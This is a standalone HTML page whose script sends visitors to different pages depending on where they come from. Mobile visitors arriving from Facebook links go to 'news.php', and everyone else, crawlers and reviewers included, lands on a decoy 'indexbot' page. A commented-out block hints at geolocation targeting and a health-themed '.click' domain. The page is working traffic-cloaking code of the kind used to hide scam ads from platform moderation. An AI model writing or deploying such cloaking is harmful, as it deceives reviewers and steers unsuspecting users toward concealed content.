<!DOCTYPE html>

<html>
<meta charset="UTF-8">
<head>
<title></title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
</head>
<body>
<script>
var device = window.navigator.platform;
// iPhone: iPhone
var referer = window.document.referrer;
// iPhone: http://m.facebook.com/
// android: https://l.facebook.com/
var deviceInfo = window.navigator.userAgent;
// iPhone:
// Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) 
// AppleWebKit/605.1.15 (KHTML, like Gecko) 
// Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone11,8;
// FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/2;FBID/phone;FBLC/vi_VN;FBOP/5]

// Android
// Mozilla/5.0 (Linux; Android 11; RMX3511 Build/RP1A.201005.001; wv) 
// AppleWebKit/537.36 (KHTML, like Gecko) 
// Version/4.0 Chrome/109.0.5414.117 
// Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]

var isIphone = deviceInfo.includes("iPhone");
var isAndroid = deviceInfo.includes("Android");
var link = '';
// var location = '';

// $.getJSON('https://geolocation-db.com/json/')
//          .done (function(location) {
//             location = location.country_name;
// });

// if(location = 'Indonesia'){
    
// }
// else{
//     link = 'https://eye-healthcare.click/page/cake/indexbot.html';
// }


switch(referer) {
        case "http://l.facebook.com/":
        case "http://lm.facebook.com/":
        case "http://m.facebook.com/":
        case "https://l.facebook.com/":
        case "https://lm.facebook.com/":
        case "https://m.facebook.com/":
            if(isIphone == true || isAndroid == true) // || device.toUpperCase() == "IPHONE"
                link = 'news.php';
            break;
        default:
            link = '../cake/indexbot.html';
    }

window.location.href = link;
</script>
</body>
</html>